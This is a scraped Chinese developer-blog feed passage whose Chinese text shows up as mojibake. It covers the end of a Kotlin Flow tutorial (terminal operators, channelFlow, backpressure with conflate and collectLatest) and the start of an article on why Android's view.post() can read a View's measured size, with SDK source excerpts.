<p><code>onCompletion</code>ç±»ä¼¼äº<code>try ... catch ... finally</code> ä¸­çš„finallyã€‚è¿™å¥—å¤„ç†æœºåˆ¶çš„è®¾è®¡åˆè¡·æ˜¯ç¡®ä¿Flowæ“ä½œä¸­å¼‚å¸¸çš„é€æ˜ï¼Œå› æ­¤æˆ‘ä»¬<strong>ä¸èƒ½</strong>æˆ–è€…<strong>ç¦æ­¢</strong>è¿™æ ·å†™ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">flow { 
    <span class="hljs-keyword">try</span> {
        emit(<span class="hljs-number">1</span>)
        <span class="hljs-keyword">throw</span> ArithmeticException(<span class="hljs-string">"Div 0"</span>)
    } <span class="hljs-keyword">catch</span> (e: ArithmeticException) {
        println(<span class="hljs-string">"caught error: <span class="hljs-variable">$e</span>"</span>)
    }<span class="hljs-keyword">finally</span> {
        println(<span class="hljs-string">"finally"</span>)
    }
}
</code></pre>
<h3 data-id="heading-4">æœ«ç«¯æ“ä½œç¬¦</h3>
<p>collectæ˜¯æœ€åŸºæœ¬çš„æœ«ç«¯æ“ä½œç¬¦ï¼Œè¿˜æœ‰å…¶ä»–æœ«ç«¯æ“ä½œç¬¦ï¼Œå¤§ä½“åˆ†ä¸ºä¸¤ç±»</p>
<ul>
<li>é›†åˆç±»å‹è½¬æ¢æ“ä½œç¬¦ï¼ŒåŒ…æ‹¬toListã€toSetç­‰</li>
<li>èšåˆæ“ä½œç¬¦ï¼ŒåŒ…æ‹¬å°†Flowè§„çº¦åˆ°å•å€¼çš„reduceã€foldç­‰æ“ä½œï¼›è¿˜æœ‰è·å¾—å•ä¸ªå…ƒç´ çš„æ“ä½œç¬¦ï¼ŒåŒ…æ‹¬singleã€singleOrNullã€firstç­‰</li>
</ul>
<p>ç”±äºFlowçš„æ¶ˆè´¹ç«¯ä¸€å®šéœ€è¦è¿è¡Œåœ¨åç¨‹ä¸­ï¼Œå› æ­¤æœ«ç«¯æ“ä½œç¬¦éƒ½æ˜¯æŒ‚èµ·å‡½æ•°ã€‚</p>
<h3 data-id="heading-5">åˆ†ç¦»Flowçš„æ¶ˆè´¹å’Œè§¦å‘</h3>
<p>æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡onEachæ¥åšåˆ°è¿™ä¸€ç‚¹ï¼Œè¿™æ ·æ¶ˆè´¹çš„å…·ä½“æ“ä½œå°±ä¸éœ€è¦ä¸æœ«ç«¯æ“ä½œç¬¦æ”¾åˆ°ä¸€èµ·ï¼Œcollectå‡½æ•°å¯ä»¥æ”¾åˆ°å…¶ä»–ä»»æ„ä½ç½®è°ƒç”¨</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createFlow</span><span class="hljs-params">()</span></span> = flow&lt;<span class="hljs-built_in">Int</span>&gt;{
    (<span class="hljs-number">1.</span><span class="hljs-number">.10</span>).forEach {
        emit(it)
        delay(<span class="hljs-number">1000</span>)
    }
}.onEach {
    println(it)
}

<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    GlobalScope.launch {
        createFlow().collect()
    }
     delay(<span class="hljs-number">20</span> * <span class="hljs-number">1000</span>)
}

</code></pre>
<p>éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼ŒFlowå¹¶æ²¡æœ‰æä¾›å–æ¶ˆæ“ä½œï¼Œæƒ³è¦å–æ¶ˆFlowï¼Œåªéœ€è¦å–æ¶ˆå®ƒæ‰€åœ¨çš„åç¨‹å³å¯ã€‚</p>
<h3 data-id="heading-6">å…¶ä»–Flowçš„åˆ›å»ºæ–¹å¼</h3>
<p>å½“æˆ‘ä»¬ä½¿ç”¨<code>flow{...}</code>æ¥åˆ›å»ºFlowæ—¶ï¼Œæ— æ³•éšæ„åˆ‡æ¢è°ƒåº¦å™¨ï¼Œå› ä¸ºemitå‡½æ•°ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚æƒ³è¦åœ¨ç”Ÿæˆå…ƒç´ æ—¶åˆ‡æ¢è°ƒåº¦å™¨ï¼Œå°±å¿…é¡»ä½¿ç”¨channelFlowå‡½æ•°æ¥åˆ›å»ºFlowï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">channelFlow { 
    send(<span class="hljs-number">1</span>)
    withContext(Dispatchers.IO){
        send(<span class="hljs-number">2</span>)
    }
}
</code></pre>
<p>æ­¤å¤–ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é›†åˆçŸ¿å»ºæ¥åˆ›å»ºFlowï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    listOf(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>).asFlow().collect { value -&gt; println(value) }
    setOf(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>).asFlow().collect { value -&gt; println(value) }
    flowOf(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>).collect { value -&gt; println(value) }
}
</code></pre>
<h3 data-id="heading-7">èƒŒå‹</h3>
<p>åªè¦æ˜¯å“åº”å¼ç¼–ç¨‹ï¼Œå°±ä¸€å®šä¼šæœ‰èƒŒå‹é—®é¢˜ï¼ŒèƒŒå‹é—®é¢˜åœ¨ç”Ÿäº§è€…çš„ç”Ÿäº§é€Ÿç‡é«˜äºæ¶ˆè´¹è€…çš„å¤„ç†é€Ÿç‡æƒ…å†µä¸‹å‡ºç°ã€‚ä¸ºäº†ä¿è¯æ•°æ®ä¸ä¸¢å¤±ï¼Œæˆ‘ä»¬å¯ä»¥æ·»åŠ ä¸€ä¸ªåˆ¶å®šå®¹é‡çš„bufferã€‚ä½†è¿™åªæ˜¯æ²»æ ‡ä¸æ²»æœ¬çš„æ–¹æ³•ï¼Œéšç€æ—¶é—´çš„æ¨ç§»ï¼Œè¿˜æ˜¯ä¼šé€ æˆæ—¶é—´ä¸Šçš„ç§¯å‹ã€‚
å‡ºç°èƒŒå‹é—®é¢˜çš„æ ¹æœ¬åŸå› æ˜¯ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…çš„é€Ÿé€Ÿç‡ä¸åŒ¹é…ï¼Œé™¤äº†ç›´æ¥ä¼˜åŒ–æ¶ˆè´¹è€…çš„æ€§èƒ½å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é‡‡å–ä¸€äº›å–èˆçš„æ‰‹æ®µã€‚</p>
<p>ç¬¬ä¸€ç§æ˜¯conflateï¼Œå’ŒChannelçš„Conflateæ¨¡å¼ä¸€è‡´ï¼Œæ–°æ•°æ®è¦†ç›–è€æ•°æ®ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
  flow {
      List(<span class="hljs-number">100</span>){
          emit(it)
      }
  }.conflate()
      .collect{value -&gt;
          println(<span class="hljs-string">"Collected: <span class="hljs-variable">$value</span>"</span>)
          delay(<span class="hljs-number">100</span>)
          println(<span class="hljs-string">"<span class="hljs-variable">$value</span> collected"</span>)
      }
}

</code></pre>
<p>è™½ç„¶æˆ‘ä»¬å‘é€äº†100ä¸ªå…ƒç´ ï¼Œä½†æœ€ç»ˆåªæ¥æ”¶åˆ°2ä¸ªï¼Œå¤šæ¬¡è¿è¡Œçš„ç»“æœå¹¶ä¸ç›¸åŒã€‚
ç¬¬äºŒç§æ˜¯collectLastedï¼Œåªå¤„ç†æœ€æ–°çš„æ•°æ®ï¼ŒåŒºåˆ«åœ¨äºï¼šcollectLastedå¹¶ä¸ä¼šç›´æ¥ç”¨æ–°æ•°æ®è¦†ç›–è€æ•°æ®ï¼Œè€Œæ˜¯æ¯ä¸€ä¸ªæ•°æ®éƒ½ä¼šå¤„ç†ï¼Œåªä¸è¿‡å¦‚æœå‰ä¸€ä¸ªè¿˜æ²¡è¢«å¤„ç†å®Œåä¸€ä¸ªå°±æ¥äº†è¯ï¼Œå¤„ç†å‰ä¸€ä¸ªæ•°æ®çš„é€»è¾‘å°±ä¼šè¢«å–æ¶ˆã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    flow {
        List(<span class="hljs-number">10</span>) {
            emit(it)
        }
    }.collectLatest { value -&gt;
        println(<span class="hljs-string">"Collected: <span class="hljs-variable">$value</span>"</span>)
        delay(<span class="hljs-number">1000</span>)
        println(<span class="hljs-string">"<span class="hljs-variable">$value</span> collected"</span>)
    }
}
</code></pre>
<p>è¾“å‡º</p>
<blockquote>
<p>Collected: 0
Collected: 1
Collected: 2
Collected: 3
Collected: 4
Collected: 5
Collected: 6
Collected: 7
Collected: 8
Collected: 9
9 collected</p>
</blockquote>
<p>å‰é¢çš„<code>println("Collected: $value")</code>è¾“å‡ºäº†æ‰€æœ‰ç»“æœï¼Œåé¢çš„<code>println("$value collected")</code>åªè¾“å‡ºäº†æœ€åä¸€ä¸ªç»“æœï¼Œå› ä¸ºåé¢çš„æ•°æ®åˆ°è¾¾æ—¶ï¼Œå¤„ç†ä¸Šä¸ªæ•°æ®çš„æ“ä½œæ­£å¥½è¢«æŒ‚èµ·äº†ã€‚</p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰mapLatest,flatMapLatestç­‰ã€‚</p>
<h3 data-id="heading-8">Flowçš„å˜æ¢</h3>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>map</code>æ¥å˜æ¢Flowçš„æ•°æ®</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    flow {
        List(<span class="hljs-number">5</span>) {
            emit(it)
        }
    }.map {
        it * <span class="hljs-number">2</span>
    }.collect {
        println(it)
    }
}
</code></pre>
<p>è¾“å‡º</p>
<blockquote>
<p>0
2
4
6
8</p>
</blockquote>
<p>è¿˜æœ‰æŒ‰ç…§é¡ºåºæ‹¼æ¥çš„flattenConcatï¼Œä¸ä¿è¯é¡ºåºçš„flattenMergeæ“ä½œç­‰</p>
<hr/>
<p>ä»¥ä¸Š</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä»€ä¹ˆview.post()èƒ½è·å–åˆ°viewçš„å®½é«˜?]]></title>    <link>https://juejin.cn/post/7590054976489717800</link>    <guid>https://juejin.cn/post/7590054976489717800</guid>    <pubDate>2026-01-02T11:57:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590054976489717800" data-draft-id="7590104561474797620" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆview.post()èƒ½è·å–åˆ°viewçš„å®½é«˜?"/> <meta itemprop="keywords" content="æºç "/> <meta itemprop="datePublished" content="2026-01-02T11:57:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="XRay"/> <meta itemprop="url" content="https://juejin.cn/user/3966693685869288"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆview.post()èƒ½è·å–åˆ°viewçš„å®½é«˜?
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3966693685869288/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    XRay
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T11:57:14.000Z" title="Fri Jan 02 2026 11:57:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°è¦è·å– view çš„å®½é«˜çš„æƒ…å†µï¼Œå¦‚æœç›´æ¥åœ¨ onCreate() æ–¹æ³•ä¸­è·å– View çš„å®½é«˜ï¼Œæ‹¿åˆ°çš„ç»“æœæ˜¯ 0ï¼Œä½†æ˜¯é€šè¿‡ view çš„ post() æ–¹æ³•å´å¯ä»¥æ‹¿åˆ° view çš„å®½é«˜ï¼Œè¿è¡Œå¦‚ä¸‹ä»£ç ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TAG</span> <span class="hljs-operator">=</span> MyActivity.class.getSimpleName();

    <span class="hljs-keyword">private</span> TextView tv;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tv = (TextView) findViewById(R.id.my_text);
        Log.d(TAG, <span class="hljs-string">"11111 width: "</span> + tv.getMeasuredWidth() + <span class="hljs-string">" - height : "</span> + tv.getHeight());
        tv.post(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() {

            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
                Log.d(TAG, <span class="hljs-string">"22222 width: "</span> + tv.getMeasuredWidth() + <span class="hljs-string">" - height : "</span> + tv.getMeasuredHeight());
            }
        });
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onResume</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">super</span>.onResume();
        Log.e(TAG, <span class="hljs-string">"33333 heightï¼š"</span> + tv.getMeasuredHeight());
    }
}
</code></pre>
<p>activity_main.xml:</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span>
    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span>
    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span>
        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/my_text"</span>
        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span>
        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span>
        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"Hello World!"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span>
</code></pre>
<p>æ‰“å°ç»“æœå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-number">11111</span> width: <span class="hljs-number">0</span> - height : <span class="hljs-number">0</span>
<span class="hljs-number">33333</span> heightï¼š<span class="hljs-number">0</span>
<span class="hljs-number">22222</span> width: <span class="hljs-number">201</span> - height : <span class="hljs-number">51</span>
</code></pre>
<p>å…¶ä¸­ getMeasuredWidth() è·å–çš„æ˜¯æˆå‘˜å˜é‡ mMeasuredWidth çš„å€¼:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getMeasuredWidth</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> mMeasuredWidth &amp; MEASURED_SIZE_MASK;
}
</code></pre>
<p>é€šè¿‡å‰é¢çš„æ–‡ç«  <a href="https://juejin.cn/post/7301648406198894618" target="_blank" title="https://juejin.cn/post/7301648406198894618">Android Viewçš„ç»˜åˆ¶æµç¨‹</a> æˆ‘ä»¬çŸ¥é“æ‰§è¡Œå®Œ View çš„ measure() æ–¹æ³•æ‰ä¼šå¯¹ mMeasuredWidth èµ‹å€¼ï¼Œç¬¬ä¸€æ¬¡è§¦å‘ç»˜åˆ¶åœ¨ OnResume() ç”Ÿå‘½å‘¨æœŸæ–¹æ³•è°ƒç”¨ä¹‹åï¼Œä¸ºä»€ä¹ˆè¿™é‡Œåœ¨ OnCreate() æ–¹æ³•é‡Œé¢æ‰§è¡Œ tv.post(Runnable action) å´å¯ä»¥è·å–åˆ°Viewçš„å®½é«˜å‘¢ï¼Ÿ</p>
<p>ä¸‹é¢æˆ‘ä»¬å°±å›´ç»•è¿™ä¸ªç–‘é—®é€šè¿‡æºç æ¥åˆ†æï¼Œæºç åŸºäºAndroid SDK 31ã€‚</p>
<p>å…ˆæ¥çœ‹çœ‹ View çš„ post() æ–¹æ³•åšäº†ä»€ä¹ˆï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">View</span>{

    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">post</span><span class="hljs-params">(Runnable action)</span> {
        <span class="hljs-keyword">final</span> <span class="hljs-type">AttachInfo</span> <span class="hljs-variable">attachInfo</span> <span class="hljs-operator">=</span> mAttachInfo;
        <span class="hljs-comment">// è‹¥ attachInfo ä¸ä¸º null,ç›´æ¥è°ƒç”¨å…¶å†…éƒ¨ Handler çš„ post() æ–¹æ³•</span>
        <span class="hljs-keyword">if</span> (attachInfo != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> attachInfo.mHandler.post(action);
        }

        <span class="hljs-comment">// ä¸‹é¢æ˜¯ attachInfo ä¸º null çš„æƒ…å†µ</span>
        getRunQueue().post(action);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
   }
}
</code></pre>
<p>è¿™é‡Œé€šè¿‡åˆ¤æ–­ attachInfo æ˜¯å¦ä¸º null è¿›è¡Œäº†ä¸åŒçš„å¤„ç†ï¼Œæˆ‘ä»¬å…ˆæ¥ç ”ç©¶ attachInfo ä¸º null çš„æƒ…å†µï¼Œ attachInfo ä¸º null æ—¶è°ƒç”¨äº† getRunQueue() çš„ post() æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">View</span>{

    <span class="hljs-comment">/**
    * Queue of pending runnables. Used to postpone calls to post() until this
    * view is attached and has a handler.
    */</span>
    <span class="hljs-keyword">private</span> HandlerActionQueue mRunQueue;

    <span class="hljs-keyword">private</span> HandlerActionQueue <span class="hljs-title function_">getRunQueue</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (mRunQueue == <span class="hljs-literal">null</span>) {
            mRunQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HandlerActionQueue</span>();
        }
        <span class="hljs-keyword">return</span> mRunQueue;
    }
}
</code></pre>
<p>å…¶ä¸­ getRunQueue() è¿”å›çš„æ˜¯ mRunQueueï¼Œå®ƒæ˜¯æ˜¯ HandlerActionQueue çš„å®ä¾‹ï¼ŒHandlerActionQueue çš„ post() æ–¹æ³•çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HandlerActionQueue</span> {

    <span class="hljs-keyword">private</span> HandlerAction[] mActions;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">post</span><span class="hljs-params">(Runnable action)</span> {
        postDelayed(action, <span class="hljs-number">0</span>);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postDelayed</span><span class="hljs-params">(Runnable action, <span class="hljs-type">long</span> delayMillis)</span> {
        <span class="hljs-comment">// 1. å°†ä¼ å…¥çš„ Runnable å°è£…æˆ HandlerAction</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">HandlerAction</span> <span class="hljs-variable">handlerAction</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HandlerAction</span>(action, delayMillis);

        <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {
            <span class="hljs-keyword">if</span> (mActions == <span class="hljs-literal">null</span>) {
                mActions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HandlerAction</span>[<span class="hljs-number">4</span>];
            }
            <span class="hljs-comment">// 2. å°† HandlerAction ä¿å­˜åœ¨ mActions æ•°ç»„ä¸­</span>
            mActions = GrowingArrayUtils.append(mActions, mCount, handlerAction);
            mCount++;
        }
    }
}
</code></pre>
<p>è¿™é‡Œå…ˆå°†ä¼ å…¥çš„ action å°è£…æˆ HandlerAction å¯¹è±¡ï¼Œç„¶åå°† HandlerAction å¯¹è±¡ä¿å­˜åˆ°äº† mActions æ•°ç»„ä¸­ã€‚ç”±æ­¤å¯çŸ¥ <code>attachInfo ä¸º null æ—¶ï¼Œpost(Runnable action) åªæ˜¯æŠŠ action æ·»åŠ åˆ° mActions æ•°ç»„é‡Œé¢å­˜äº†èµ·æ¥ï¼Œæš‚æ—¶è¿˜æ²¡æœ‰æ‰§è¡Œ</code>ã€‚è€Œæ‰§è¡Œ View çš„ post() æ–¹æ³•æ—¶ attachInfo æ˜¯å¦ä¸º null å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼ŒView ä¸­åªæœ‰ä¸€å¤„ç»™ mAttachInfo èµ‹å€¼çš„åœ°æ–¹ï¼Œåœ¨ dispatchAttachedToWindow() æ–¹æ³•ä¸­ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">View</span>{

    <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispatchAttachedToWindow</span><span class="hljs-params">(AttachInfo info, <span class="hljs-type">int</span> visibility)</span> {
        <span class="hljs-comment">// ç»™ mAttachInfo èµ‹å€¼ï¼Œæ­¤æ—¶åŒä¸€ä¸ª ViewRootImpl å†…çš„æ‰€æœ‰ View å…±ç”¨åŒä¸€ä¸ª AttachInfo</span>
        mAttachInfo = info;
        ...
        <span class="hljs-comment">// mRunQueue åˆå‡ºç°äº†ï¼Œå…¶å†…éƒ¨ä¿å­˜äº†æˆ‘ä»¬çš„ action ä»»åŠ¡</span>
        <span class="hljs-keyword">if</span> (mRunQueue != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// å†…éƒ¨æ‰§è¡Œäº† info.mHandler.post(action)</span>
            mRunQueue.executeActions(info.mHandler);
            mRunQueue = <span class="hljs-literal">null</span>;
        }
        ...
    }
}
</code></pre>
